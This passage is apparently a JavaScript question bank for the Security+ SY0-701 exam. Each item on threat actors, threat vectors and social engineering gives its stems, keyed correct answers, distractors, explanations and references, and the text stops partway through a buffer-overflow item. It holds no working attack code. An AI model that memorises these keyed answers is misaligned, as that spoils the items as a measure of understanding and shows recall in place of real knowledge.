// Domain 2 — Threats, Vulnerabilities, and Mitigations (SY0-701). Add new questions at the end.
QBANK.add([
  {
    id: "d2-001",
    domain: 2,
    objective: "2.4",
    topic: "Password spraying",
    type: "single",
    stems: [
      "A SOC analyst sees a single failed login for each of 400 different user accounts, all from one IP address and all using the password 'Spring2024!'. Which of the following attacks is most likely occurring?",
      "Authentication logs show an attacker trying one or two very common passwords against every account in the directory, which avoids lockout thresholds. Which of the following best describes this activity?",
      "Which of the following attacks tries a small number of commonly used passwords across many accounts to evade account lockout policies?"
    ],
    correct: ["Password spraying"],
    wrong: ["Brute force", "Credential replay", "Birthday attack", "Rainbow table attack"],
    explanation: "Password spraying tries a few common passwords against many accounts, so each account sees only one or two failures and stays below the lockout threshold. Brute force tries many passwords against one account (which triggers lockouts). Credential replay reuses captured credentials or tokens. Birthday and rainbow table attacks target hashes, not live logins.",
    hint: "Many accounts x few passwords = spraying. One account x many passwords = brute force.",
    refs: [
      { title: "MITRE ATT&CK T1110.003 Password Spraying", url: "https://attack.mitre.org/techniques/T1110/003/" },
      { title: "Professor Messer SY0-701: Password Attacks (2.4)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/password-attacks-sy0-701/" }
    ]
  },

  // ---------- 2.1 Threat actors and motivations ----------
  {
    id: "d2-002", domain: 2, objective: "2.1", topic: "Nation-state", type: "single",
    stems: [
      "A defense contractor finds that an intruder kept quiet access to its engineering network for 18 months, using custom malware to steal weapons research. Threat intelligence links the tools to a foreign military unit. Which of the following threat actors is most likely responsible?",
      "A power utility's incident report describes a highly sophisticated, long-term intrusion that a foreign government funded to prepare for possible disruption of the grid during a conflict. Which of the following best describes this threat actor?",
      "Which of the following threat actors is most likely to have extensive government funding and to run advanced persistent threat (APT) campaigns for espionage?"
    ],
    correct: ["Nation-state"],
    wrong: ["Unskilled attacker", "Hacktivist", "Organized crime", "Shadow IT", "Insider threat"],
    explanation: "Nation-state actors are governments or arms of governments. They have extensive resources and high sophistication, and they often run long-term APT campaigns for espionage, disruption, or war. Organized crime is also well funded but is motivated by money, not national goals. Unskilled attackers, hacktivists, and shadow IT do not have government backing.",
    hint: "Foreign government + long-term stealth + custom tools = nation-state (APT).",
    refs: [
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" },
      { title: "NIST CSRC Glossary: advanced persistent threat", url: "https://csrc.nist.gov/glossary/term/advanced_persistent_threat" },
      { title: "CISA: Nation-State Threats", url: "https://www.cisa.gov/topics/cyber-threats-and-advisories/nation-state-cyber-actors" }
    ]
  },
  {
    id: "d2-003", domain: 2, objective: "2.1", topic: "Unskilled attacker", type: "single",
    stems: [
      "A web server log shows hundreds of requests that match a free exploit script posted on a public forum. The script targets a flaw the server does not have, and the attacker never changes the script after it fails. Which of the following threat actors is most likely responsible?",
      "A teenager downloads a ready-made DDoS tool from a forum and points it at a school's website without understanding how the tool works. Which of the following best describes this threat actor?",
      "Which of the following threat actors typically has limited funding and low sophistication, and relies on tools and scripts that others created?",
      "An attacker points a free vulnerability scanner and a public exploit kit at a company's web server and gets in through an old, unpatched plugin. Which of the following threat actors most likely did this?"
    ],
    correct: ["Unskilled attacker"],
    wrong: ["Nation-state", "Organized crime", "Insider threat", "Advanced persistent threat"],
    explanation: "An unskilled attacker runs scripts and tools made by others without knowing how they work. If the script fails, the attacker does not have the skill to change it. These attackers have limited resources and low sophistication. Nation-states, APT groups, and organized crime are well funded and highly capable, and an insider threat already has internal access.",
    hint: "Runs someone else's script and cannot fix it when it fails = unskilled attacker (SY0-701 term).",
    refs: [
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" },
      { title: "NIST CSRC Glossary: threat actor", url: "https://csrc.nist.gov/glossary/term/threat_actor" }
    ]
  },
  {
    id: "d2-004", domain: 2, objective: "2.1", topic: "Hacktivist", type: "single",
    stems: [
      "Shortly after an oil company announces a new drilling project, attackers deface its public website with an environmental protest message and post its internal emails online. Which of the following threat actors is most likely responsible?",
      "A group that opposes a new surveillance law launches a DDoS attack against a ministry's website and announces its demands for repeal on social media. Which of the following best describes this group?",
      "Which of the following threat actors is primarily motivated by philosophical or political beliefs and often uses defacement, DDoS, or document leaks?"
    ],
    correct: ["Hacktivist"],
    wrong: ["Organized crime", "Unskilled attacker", "Shadow IT", "Insider threat"],
    explanation: "A hacktivist (hacker activist) attacks to promote a political or philosophical cause. Common methods are website defacement, DDoS, and the release of private documents. Organized crime wants money, an unskilled attacker has no specific cause, and shadow IT and insider threats are internal.",
    hint: "Protest message or political demand = hacktivist.",
    refs: [
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" },
      { title: "MITRE ATT&CK T1491.002 External Defacement", url: "https://attack.mitre.org/techniques/T1491/002/" }
    ]
  },
  {
    id: "d2-005", domain: 2, objective: "2.1", topic: "Shadow IT", type: "single",
    stems: [
      "The marketing department buys its own cloud file-sharing subscription with a corporate credit card and stores customer lists there without telling the IT department. Which of the following threat actors does this represent?",
      "During an audit, a security team finds a wireless access point and a small server that the engineering group set up under a desk to avoid the change control process. Which of the following best describes this situation?",
      "Which of the following is an internal threat actor that works around IT policies by deploying its own systems or cloud services without approval?"
    ],
    correct: ["Shadow IT"],
    wrong: ["Hacktivist", "Unskilled attacker", "Organized crime", "Nation-state"],
    explanation: "Shadow IT is a group or department that builds its own infrastructure or buys its own services without IT approval, which avoids change control, backups, and security review. It is internal and usually not malicious, but it creates real risk. Hacktivists, unskilled attackers, organized crime, and nation-states are usually external attackers.",
    hint: "Unapproved IT bought or built by a department = shadow IT.",
    refs: [
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" }
    ]
  },
  {
    id: "d2-006", domain: 2, objective: "2.1", topic: "Insider threat", type: "single",
    stems: [
      "Two days after a database administrator gets a termination notice, monitoring shows the administrator's valid account copying the full customer table to a personal cloud drive. Which of the following threat actors is involved?",
      "A payroll clerk who was passed over for promotion uses legitimate access to change the direct-deposit details of several employees to an account the clerk controls. Which of the following best describes this threat actor?",
      "Which of the following threat actors already has authorized access and detailed knowledge of where an organization's sensitive data is stored?"
    ],
    correct: ["Insider threat"],
    wrong: ["Hacktivist", "Unskilled attacker", "Nation-state", "Organized crime"],
    explanation: "An insider threat is a person inside the organization who uses authorized access to cause harm, often for revenge or financial gain. Insiders know where the data is and how to get around controls. The other actors are external and must first gain access.",
    hint: "Valid account + inside knowledge + grudge or greed = insider threat.",
    refs: [
      { title: "CISA: Defining Insider Threats", url: "https://www.cisa.gov/topics/physical-security/insider-threat-mitigation/defining-insider-threats" },
      { title: "NIST CSRC Glossary: insider threat", url: "https://csrc.nist.gov/glossary/term/insider_threat" },
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" }
    ]
  },
  {
    id: "d2-007", domain: 2, objective: "2.1", topic: "Organized crime", type: "single",
    stems: [
      "A ransomware group runs its operation like a business, with separate teams for initial access, negotiation, and customer support for victims who pay. Which of the following threat actors best fits this description?",
      "Investigators find that a well-funded group steals payment card data from retailers and sells it in bulk on dark web markets. Which of the following threat actors is most likely responsible?",
      "Which of the following threat actors is primarily motivated by financial gain and often has significant resources and a corporate-like structure?"
    ],
    correct: ["Organized crime"],
    wrong: ["Hacktivist", "Unskilled attacker", "Shadow IT", "Insider threat"],
    explanation: "Organized crime groups attack to make money. They often have large budgets and a business structure, with roles for hacking, exploit development, data sales, and even victim support. Hacktivists have political goals, unskilled attackers have few resources, and shadow IT and insiders are internal.",
    hint: "Profit + business-like structure = organized crime.",
    refs: [
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" },
      { title: "CISA #StopRansomware Guide", url: "https://www.cisa.gov/stopransomware/ransomware-guide" }
    ]
  },
  {
    id: "d2-008", domain: 2, objective: "2.1", topic: "Threat actor attributes", type: "multi",
    stems: [
      "A threat intelligence report profiles a group that a foreign government's intelligence service supports. Which of the following attributes best describe this type of threat actor?",
      "A CISO briefs the board about nation-state threat actors. Which of the following attributes should the CISO describe as typical of these actors?"
    ],
    correct: ["Extensive resources and funding", "High level of sophistication"],
    wrong: ["Internal access to company systems", "Very limited funding", "Low technical capability", "Reliance on prewritten scripts"],
    explanation: "Nation-state actors have the resources of a government behind them, so they have extensive funding and a very high level of sophistication, and can build their own tools. They are usually external, not internal. Limited funding, low capability, and prewritten scripts describe an unskilled attacker.",
    hint: "Government backing = most money + most skill.",
    refs: [
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" },
      { title: "NIST CSRC Glossary: advanced persistent threat", url: "https://csrc.nist.gov/glossary/term/advanced_persistent_threat" }
    ]
  },
  {
    id: "d2-009", domain: 2, objective: "2.1", topic: "Threat actor motivations", type: "match",
    stems: [
      "A threat intelligence analyst reviews several incident summaries. Match each incident with the attacker motivation it most likely represents."
    ],
    pairs: [
      { item: "Agents of a competitor quietly copy product designs from a research server over several months", answer: "Espionage" },
      { item: "A group steals payment card numbers from a retailer and sells them online", answer: "Financial gain" },
      { item: "A recently fired administrator uses a forgotten account to delete the company's backups", answer: "Revenge" },
      { item: "Activists leak internal memos to protest the company's labor practices", answer: "Philosophical/political beliefs" },
      { item: "An attacker threatens to publish an executive's private photos unless she provides VPN credentials", answer: "Blackmail" },
      { item: "During an armed conflict, a military cyber unit disables the opposing country's power grid", answer: "War" }
    ],
    extraOptions: ["Ethical", "Disruption/chaos"],
    explanation: "Espionage is the secret theft of information such as trade secrets. Selling stolen card data is financial gain. A fired employee who destroys data acts from revenge. Leaks to protest a cause come from philosophical or political beliefs. A threat to expose private material unless the victim complies is blackmail. Attacks on infrastructure by a military during a conflict are war.",
    hint: "Ask: what does the attacker get? Secrets, money, payback, a cause, leverage, or military advantage.",
    refs: [
      { title: "Professor Messer SY0-701: Threat Actors (2.1)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/threat-actors-sy0-701/" },
      { title: "MITRE ATT&CK T1657 Financial Theft", url: "https://attack.mitre.org/techniques/T1657/" }
    ]
  },

  // ---------- 2.2 Threat vectors and attack surfaces ----------
  {
    id: "d2-010", domain: 2, objective: "2.2", topic: "Smishing", type: "single",
    stems: [
      "Several employees get a text message that says a package delivery failed and asks them to tap a link to update their address. Which of the following attacks is this?",
      "A customer's phone gets an SMS that appears to come from the bank's fraud team and asks the customer to confirm a PIN at a link. Which of the following best describes this attack?",
      "Which of the following social engineering attacks uses text messages to trick a victim into opening a malicious link or revealing information?"
    ],
    correct: ["Smishing"],
    wrong: ["Vishing", "Pharming", "Whaling", "Watering hole attack", "Typosquatting"],
    explanation: "Smishing is SMS phishing: the lure arrives as a text message. Vishing uses voice calls, whaling targets senior executives, pharming redirects users through DNS or hosts-file manipulation, and a watering hole attack infects a website the targets visit.",
    hint: "S for SMS = smishing. V for voice = vishing.",
    refs: [
      { title: "Professor Messer SY0-701: Phishing (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/phishing-sy0-701/" },
      { title: "CISA: Avoiding Social Engineering and Phishing Attacks", url: "https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks" }
    ]
  },
  {
    id: "d2-011", domain: 2, objective: "2.2", topic: "Vishing", type: "single",
    stems: [
      "An employee gets a phone call from someone who claims to be from the IT help desk and asks the employee to read back the MFA code that was just sent to the employee's phone. Which of the following attacks is occurring?",
      "A caller says he is from the credit card company's fraud department and asks a customer to verify the full card number and security code. Which of the following best describes this attack?",
      "Which of the following social engineering attacks uses voice calls to persuade a target to reveal sensitive information?"
    ],
    correct: ["Vishing"],
    wrong: ["Smishing", "Pharming", "Watering hole attack", "Typosquatting", "Business email compromise"],
    explanation: "Vishing is voice phishing: the attacker uses a phone call, often while pretending to be a trusted party, to get information such as codes or card numbers. Smishing uses text messages, BEC uses email, and pharming, typosquatting, and watering holes send users to malicious websites.",
    hint: "Phone call = vishing (voice phishing).",
    refs: [
      { title: "MITRE ATT&CK T1566.004 Spearphishing Voice", url: "https://attack.mitre.org/techniques/T1566/004/" },
      { title: "Professor Messer SY0-701: Impersonation (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/impersonation-sy0-701/" }
    ]
  },
  {
    id: "d2-012", domain: 2, objective: "2.2", topic: "Business email compromise", type: "single",
    stems: [
      "The accounts payable team gets an email from a vendor's real mailbox, which attackers took over, stating that the vendor's bank account has changed and the next invoice must be paid to a new account. Which of the following attacks is this?",
      "A CFO gets an urgent email that appears to come from the CEO's account and asks for a confidential wire transfer to close an acquisition today. The CEO did not send it. Which of the following best describes this attack?",
      "Which of the following attacks uses a compromised or spoofed business email account to trick employees into sending money or sensitive data?"
    ],
    correct: ["Business email compromise"],
    wrong: ["Vishing", "Watering hole attack", "Typosquatting", "Smishing", "Pharming"],
    explanation: "Business email compromise (BEC) uses a compromised or spoofed executive or vendor email account to request wire transfers, payment changes, or sensitive data. It relies on trust in the business relationship. Vishing uses phone calls, smishing uses texts, and the other options redirect users to malicious sites.",
    hint: "Trusted business mailbox + urgent payment change = BEC.",
    refs: [
      { title: "FBI IC3 PSA: Business Email Compromise", url: "https://www.ic3.gov/PSA/2024/PSA240911" },
      { title: "Professor Messer SY0-701: Phishing (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/phishing-sy0-701/" }
    ]
  },
  {
    id: "d2-013", domain: 2, objective: "2.2", topic: "BEC countermeasures", type: "multi",
    stems: [
      "After a near-miss with a fraudulent wire transfer request sent by email, a CFO wants to reduce the risk of business email compromise. Which of the following controls would be most effective?",
      "A company's finance team often gets emails that ask it to change vendor bank details. Which of the following would best reduce the risk that these requests are fraudulent?"
    ],
    correct: ["Verify payment changes by calling a known phone number", "Require MFA on all email accounts"],
    wrong: ["Allow automatic forwarding to external addresses", "Increase mailbox storage quotas", "Disable spam filtering for vendor domains", "Publish staff email addresses on the website"],
    explanation: "Out-of-band verification, such as a call to a phone number already on file, stops a fraudulent payment change even when the email looks real. MFA makes it much harder for attackers to take over the email accounts that BEC depends on. Auto-forwarding, weaker filtering, and public email lists increase risk, and mailbox size has no effect.",
    hint: "Verify through a second channel, and protect the mailbox with MFA.",
    refs: [
      { title: "FBI IC3 PSA: Business Email Compromise", url: "https://www.ic3.gov/PSA/2024/PSA240911" },
      { title: "CISA: Avoiding Social Engineering and Phishing Attacks", url: "https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks" }
    ]
  },
  {
    id: "d2-014", domain: 2, objective: "2.2", topic: "Typosquatting", type: "single",
    stems: [
      "Users who mistype the company's domain as 'examplle.com' land on a look-alike login page that an attacker registered. Which of the following techniques did the attacker use?",
      "A threat feed reports that someone registered 'rnicrosoft-support.com', which looks like a real domain when read quickly, to collect credentials. Which of the following best describes this technique?",
      "Which of the following attacks relies on users making a typing mistake in a URL so that they reach a malicious site with a similar name?"
    ],
    correct: ["Typosquatting"],
    wrong: ["Domain hijacking", "Watering hole attack", "DNS cache poisoning", "Pretexting", "Vishing"],
    explanation: "Typosquatting (also called URL hijacking) registers domain names that are close misspellings of real ones, so users who mistype or misread a URL reach the attacker's site. Domain hijacking takes control of the real domain, DNS cache poisoning corrupts resolver records, and a watering hole compromises a site the victims already trust.",
    hint: "Misspelled look-alike domain = typosquatting.",
    refs: [
      { title: "CAPEC-630: TypoSquatting", url: "https://capec.mitre.org/data/definitions/630.html" },
      { title: "Professor Messer SY0-701: DNS Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/dns-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-015", domain: 2, objective: "2.2", topic: "Watering hole attack", type: "single",
    stems: [
      "Attackers who want to breach several regional banks compromise a banking-industry news site that bank employees visit daily, and add a malicious script to it. Which of the following attacks is this?",
      "A security analyst finds that a local restaurant's online menu site, which many of the company's employees use for lunch orders, was changed to deliver malware. Which of the following best describes this attack?",
      "Which of the following attacks compromises a trusted third-party website that the intended victims often visit?"
    ],
    correct: ["Watering hole attack"],
    wrong: ["Typosquatting", "Spear phishing", "Smishing", "Pharming", "Brand impersonation"],
    explanation: "A watering hole attack infects a legitimate website that the target group visits often, and waits for victims to come to it. Typosquatting and brand impersonation use fake sites, pharming redirects DNS, and spear phishing and smishing send messages directly to the targets.",
    hint: "Poison the place where the targets already go = watering hole.",
    refs: [
      { title: "NIST CSRC Glossary: watering hole attack", url: "https://csrc.nist.gov/glossary/term/watering_hole_attack" },
      { title: "Professor Messer SY0-701: Watering Hole Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/watering-hole-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-016", domain: 2, objective: "2.2", topic: "Brand impersonation", type: "single",
    stems: [
      "Attackers create many websites that copy a popular software company's name, logo, and page design so that search results lead users to download a fake installer. Which of the following best describes this technique?",
      "Customers report a social media account that uses a retailer's exact logo and colors to run a fake 'loyalty rewards' giveaway that collects card numbers. Which of the following attacks is this?"
    ],
    correct: ["Brand impersonation"],
    wrong: ["Watering hole attack", "Business email compromise", "Vishing", "Smishing", "Domain hijacking"],
    explanation: "Brand impersonation copies a well-known company's name, logos, and look so victims trust a fake site, account, or download. A watering hole compromises a real site, BEC uses business email accounts, and vishing and smishing use calls and texts. Domain hijacking takes over the real domain instead of copying the brand.",
    hint: "Fake site or account dressed in a real company's branding = brand impersonation.",
    refs: [
      { title: "Professor Messer SY0-701: Other Social Engineering Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/other-social-engineering-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-017", domain: 2, objective: "2.2", topic: "Pretexting", type: "single",
    stems: [
      "A visitor tells the receptionist she is from the fire inspection contractor, that the yearly inspection is overdue, and that she must check the server room today. Which of the following best describes her use of this invented story?",
      "An attacker emails HR and claims to be an outside auditor who needs a list of employee names and start dates to finish a compliance review due today. Which of the following describes the attacker's use of a made-up scenario?",
      "Which of the following social engineering techniques involves creating a believable, fabricated scenario to persuade a target to give information or access?"
    ],
    correct: ["Pretexting"],
    wrong: ["Typosquatting", "Watering hole attack", "Brand impersonation", "Disinformation", "Smishing"],
    explanation: "Pretexting is the creation of a fabricated scenario (a pretext) that gives the target a reason to comply. The attacker often impersonates someone as part of the story. Typosquatting and brand impersonation use fake sites, watering holes infect real sites, disinformation spreads false content to the public, and smishing uses text messages.",
    hint: "Pretext = the cover story.",
    refs: [
      { title: "CAPEC-407: Pretexting", url: "https://capec.mitre.org/data/definitions/407.html" },
      { title: "Professor Messer SY0-701: Impersonation (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/impersonation-sy0-701/" }
    ]
  },
  {
    id: "d2-018", domain: 2, objective: "2.2", topic: "Disinformation", type: "single",
    stems: [
      "A company's security team finds a network of fake social media accounts that deliberately post false claims that the company's product causes illness. Which of the following best describes this content?",
      "A foreign influence group knowingly spreads fabricated news stories about an election and uses bots to amplify them. Which of the following terms best describes this content?",
      "Which of the following is false information that is created and shared with the deliberate intent to deceive?"
    ],
    correct: ["Disinformation"],
    wrong: ["Misinformation", "Typosquatting", "Pretexting", "Watering hole attack"],
    explanation: "Disinformation is false information that someone creates or spreads on purpose to deceive or cause harm, often amplified by fake accounts. Misinformation is also false, but it is shared without the intent to deceive. Typosquatting, pretexting, and watering holes are different social engineering methods.",
    hint: "Dis = deliberate. Mis = mistaken.",
    refs: [
      { title: "Professor Messer SY0-701: Other Social Engineering Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/other-social-engineering-attacks-sy0-701/" },
      { title: "CISA: Tactics of Disinformation", url: "https://www.cisa.gov/resources-tools/resources/tactics-disinformation" }
    ]
  },
  {
    id: "d2-019", domain: 2, objective: "2.2", topic: "Image-based vector", type: "single",
    stems: [
      "A web application accepts profile pictures in SVG format. A tester uploads an SVG file whose XML contains JavaScript, and the script runs when other users view the profile. Which of the following threat vectors does this show?",
      "A security analyst warns that attackers are hiding malicious code inside graphics, such as SVG files with embedded scripts that run in the browser. Which of the following threat vectors is the analyst concerned about?"
    ],
    correct: ["Image-based"],
    wrong: ["Voice call", "Removable device", "Default credentials", "Unsecure wireless network", "Open service ports"],
    explanation: "SVG images are XML files that can contain HTML or JavaScript, so an image can carry an attack such as cross-site scripting. SY0-701 lists this as an image-based threat vector. The other options are unrelated vectors: phone calls, USB devices, unchanged passwords, weak Wi-Fi, and exposed services.",
    hint: "SVG = XML that can hold script, so images can be a vector.",
    refs: [
      { title: "Professor Messer SY0-701: Common Threat Vectors (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/common-threat-vectors-sy0-701/" },
      { title: "OWASP File Upload Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" }
    ]
  },
  {
    id: "d2-020", domain: 2, objective: "2.2", topic: "Message-based vectors", type: "multi",
    stems: [
      "A security awareness trainer explains that some threat vectors deliver malicious links or requests through communication apps. Which of the following are message-based threat vectors?",
      "A company wants its phishing simulations to cover every message-based threat vector in its risk register. Which of the following should the simulations include?"
    ],
    correct: ["Email", "SMS text messages", "Instant messaging"],
    wrong: ["Removable USB drives", "Open service ports", "Default credentials"],
    explanation: "SY0-701 lists email, SMS, and instant messaging (IM) as message-based threat vectors. Attackers use them to send malicious links, attachments, and social engineering requests. Removable drives, open ports, and default credentials are separate threat vectors.",
    hint: "Message-based = anything that delivers a message: email, SMS, IM.",
    refs: [
      { title: "Professor Messer SY0-701: Common Threat Vectors (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/common-threat-vectors-sy0-701/" },
      { title: "MITRE ATT&CK T1566 Phishing", url: "https://attack.mitre.org/techniques/T1566/" }
    ]
  },
  {
    id: "d2-021", domain: 2, objective: "2.2", topic: "Removable device", type: "single",
    stems: [
      "Several USB flash drives labeled 'Q4 Salaries' are found in the employee parking lot. One was plugged into an office PC and installed malware. Which of the following threat vectors was used?",
      "An attacker wants to reach an air-gapped network that has no external network connections. Which of the following threat vectors would most likely let the attacker introduce malware?",
      "A user plugs in a free USB stick from a trade show, and the stick identifies itself as a keyboard and types malicious commands. Which of the following threat vectors does this represent?"
    ],
    correct: ["Removable device"],
    wrong: ["Watering hole attack", "Voice call", "Open service ports", "Typosquatting", "Default credentials"],
    explanation: "Removable devices such as USB drives can carry malware past firewalls and even into air-gapped networks, and some can act as a keyboard to type commands. Watering holes and typosquatting need web access, open ports and default credentials need network reach, and voice calls are social engineering.",
    hint: "Air gap or USB drop = removable device.",
    refs: [
      { title: "MITRE ATT&CK T1091 Replication Through Removable Media", url: "https://attack.mitre.org/techniques/T1091/" },
      { title: "CISA: Using Caution with USB Drives", url: "https://www.cisa.gov/news-events/news/using-caution-usb-drives" },
      { title: "Professor Messer SY0-701: Common Threat Vectors (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/common-threat-vectors-sy0-701/" }
    ]
  },
  {
    id: "d2-022", domain: 2, objective: "2.2", topic: "Default credentials", type: "single",
    stems: [
      "A botnet takes over thousands of internet-connected cameras by logging in to their web consoles with the username 'admin' and the password 'admin'. Which of the following threat vectors did the attackers use?",
      "During a penetration test, a tester gets full control of a new wireless router because no one changed the password printed in the vendor's manual. Which of the following threat vectors did the tester exploit?"
    ],
    correct: ["Default credentials"],
    wrong: ["Zero-day vulnerability", "Unsupported system", "Watering hole attack", "Image-based", "Removable device"],
    explanation: "Default credentials are the factory usernames and passwords that ship with a device and are easy to find online. If no one changes them, an attacker can log in with full access. No unknown flaw (zero-day), end-of-support system, compromised website, image file, or USB device was needed.",
    hint: "admin/admin or the password in the manual = default credentials.",
    refs: [
      { title: "MITRE ATT&CK T1078.001 Default Accounts", url: "https://attack.mitre.org/techniques/T1078/001/" },
      { title: "CWE-1392: Use of Default Credentials", url: "https://cwe.mitre.org/data/definitions/1392.html" },
      { title: "CISA: Risks of Default Passwords on the Internet", url: "https://www.cisa.gov/news-events/alerts/2013/06/24/risks-default-passwords-internet" }
    ]
  },
  {
    id: "d2-023", domain: 2, objective: "2.2", topic: "Supply chain vector", type: "single",
    stems: [
      "Attackers compromise a managed service provider's remote monitoring tool and use it to push ransomware to every client the provider manages. Which of the following threat vectors was used against the clients?",
      "A retailer's network is breached with credentials stolen from its HVAC contractor, which had remote access for maintenance. Which of the following threat vectors does this represent?",
      "A company finds that network switches it bought from an unauthorized reseller are counterfeits that could contain malicious code. Which of the following threat vectors does this represent?"
    ],
    correct: ["Supply chain"],
    wrong: ["Watering hole attack", "Removable device", "Typosquatting", "Default credentials"],
    explanation: "Supply chain vectors come through trusted third parties: managed service providers (MSPs), vendors, and suppliers, including hardware that was tampered with or counterfeited. The attacker abuses the trust and access that the third party already has. The other options do not depend on a third-party relationship.",
    hint: "Attack arrives through an MSP, vendor, or supplier = supply chain.",
    refs: [
      { title: "MITRE ATT&CK T1199 Trusted Relationship", url: "https://attack.mitre.org/techniques/T1199/" },
      { title: "MITRE ATT&CK T1195 Supply Chain Compromise", url: "https://attack.mitre.org/techniques/T1195/" },
      { title: "Professor Messer SY0-701: Common Threat Vectors (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/common-threat-vectors-sy0-701/" }
    ]
  },
  {
    id: "d2-024", domain: 2, objective: "2.2", topic: "Unsupported systems", type: "single",
    stems: [
      "A hospital still runs an imaging workstation on an operating system that the vendor stopped supporting years ago, so no new security patches are available. Which of the following threat vectors does this workstation present?",
      "A network scan finds an old PC under a desk that runs an operating system version that no longer receives updates from its manufacturer. Which of the following best describes this risk?"
    ],
    correct: ["Unsupported system"],
    wrong: ["Default credentials", "Typosquatting", "Watering hole attack", "Image-based", "Removable device"],
    explanation: "An unsupported system no longer gets security patches from its manufacturer, so every new vulnerability stays open. This is why an accurate inventory and regular scans are important. The other options describe different vectors that do not depend on the lack of vendor support.",
    hint: "No more patches from the vendor = unsupported system.",
    refs: [
      { title: "Professor Messer SY0-701: Common Threat Vectors (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/common-threat-vectors-sy0-701/" },
      { title: "CWE-1104: Use of Unmaintained Third Party Components", url: "https://cwe.mitre.org/data/definitions/1104.html" }
    ]
  },
  {
    id: "d2-025", domain: 2, objective: "2.2", topic: "Client-based vs agentless", type: "single",
    stems: [
      "A company replaces its installed desktop expense client with a web-based expense application that users open in a browser. Nothing is installed on the endpoints. If a vulnerability is found in the application code, where must it be fixed?",
      "A vendor offers its product in two forms: an installed client and an agentless, browser-based version. For the agentless version, where is a security patch for the application code installed?"
    ],
    correct: ["On the central server that hosts the application"],
    wrong: ["On each user's workstation that opens the application", "In the browser cache of every user who connects", "On every mobile device that accesses the application", "In the antivirus agent on each connecting endpoint"],
    explanation: "Agentless software, such as a web application, runs on a central server, and users only connect to it. A vulnerability in that code is fixed once on the server. The same central point also means that a compromised server could affect every connecting user. Client-based software, in contrast, must be patched on each endpoint.",
    hint: "Agentless = nothing installed locally, so the fix goes on the server.",
    refs: [
      { title: "Professor Messer SY0-701: Common Threat Vectors (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/common-threat-vectors-sy0-701/" },
      { title: "CISA: Understanding Patches and Software Updates", url: "https://www.cisa.gov/news-events/news/understanding-patches-and-software-updates" }
    ]
  },
  {
    id: "d2-026", domain: 2, objective: "2.2", topic: "Unsecure networks", type: "single",
    stems: [
      "During a walkthrough, an auditor plugs a laptop into a live network jack in the visitor lobby and gets full access to the internal LAN without any authentication. Which of the following threat vectors does this reveal?",
      "A warehouse still uses WEP on its wireless network, and an attacker cracks the key from a car in the parking lot. Which of the following threat vectors did the attacker use?",
      "Researchers show that they can take over nearby laptops through a flaw in the laptops' Bluetooth implementation. Which of the following threat vectors does this demonstrate?"
    ],
    correct: ["Unsecure network"],
    wrong: ["Removable device", "Image-based", "Voice call", "Default credentials", "Typosquatting"],
    explanation: "SY0-701 groups wired, wireless, and Bluetooth weaknesses as unsecure network vectors. Open wired ports without 802.1X, outdated Wi-Fi protocols such as WEP, and flawed Bluetooth stacks all give attackers a way onto the network or device. The other options are not network-access weaknesses.",
    hint: "Wired jack, weak Wi-Fi, or Bluetooth = unsecure network.",
    refs: [
      { title: "Professor Messer SY0-701: Common Threat Vectors (2.2)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/common-threat-vectors-sy0-701/" },
      { title: "NIST SP 800-121 Rev. 2: Guide to Bluetooth Security", url: "https://csrc.nist.gov/pubs/sp/800/121/r2/upd1/final" },
      { title: "CISA: Securing Wireless Networks", url: "https://www.cisa.gov/news-events/news/securing-wireless-networks" }
    ]
  },

  // ---------- 2.3 Types of vulnerabilities ----------
  {
    id: "d2-027", domain: 2, objective: "2.3", topic: "Buffer overflow", type: "single",
    stems: [
      "A security researcher sends a 5,000-character string to a field that expects 32 characters. The application crashes, and the extra data overwrites the return address in memory. Which of the following vulnerabilities did the researcher find?",
      "A C program copies user input into a fixed-size array without checking its length, which lets an attacker overwrite adjacent memory and run code. Which of the following vulnerabilities does this describe?",
      "Which of the following vulnerabilities occurs when a program writes more data into a memory area than the area was allocated to hold?"
    ],
    correct: ["Buffer overflow"],
    wrong: ["SQL injection", "Race condition", "Cross-site scripting", "Directory traversal"],
